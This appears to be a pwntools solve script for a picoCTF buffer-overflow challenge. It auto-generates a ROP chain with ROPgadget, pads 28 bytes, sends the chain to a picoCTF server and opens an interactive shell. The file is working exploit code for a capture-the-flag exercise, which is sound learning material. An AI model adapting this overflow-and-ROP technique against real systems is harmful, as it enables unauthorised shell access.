#!/usr/bin/env python

from asyncio import subprocess
from pwn import *

binary = './vuln'

log.info("Finding the ROP gadget")
rop = subprocess.run(f"ROPgadget --ropchain --binary {binary}", text=True, shell=True, capture_output=True).stdout

python_ropchain = rop[rop.find("#!"):].replace("\t", "")

if "#!/usr/bin/env python" in python_ropchain:
  python_ropchain = python_ropchain.split("\n")
  python_ropchain[-1] = "print p"
  python_ropchain = "\n".join(python_ropchain)
  log.success("ROPGadget found")
else:
  log.error("No ROPGadget found")

with open('payload.py', 'w') as f:
  f.write(python_ropchain)

subprocess.run(f"python2.7 payload.py > payload", text=True, shell=True, capture_output=True)

ropchain = open('payload', 'rb').read()
log.success('Rop chain build successfully')
# print(ropchain)

# vuln = ELF(binary)
# main_address = vuln.symbols['main']

# p = process(binary)
p = remote('saturn.picoctf.net', 60118)

offset = 28

print(p.recv())

payload = [
  b"A" * offset,
  ropchain
]

p.sendline(b"".join(payload))
p.interactive()

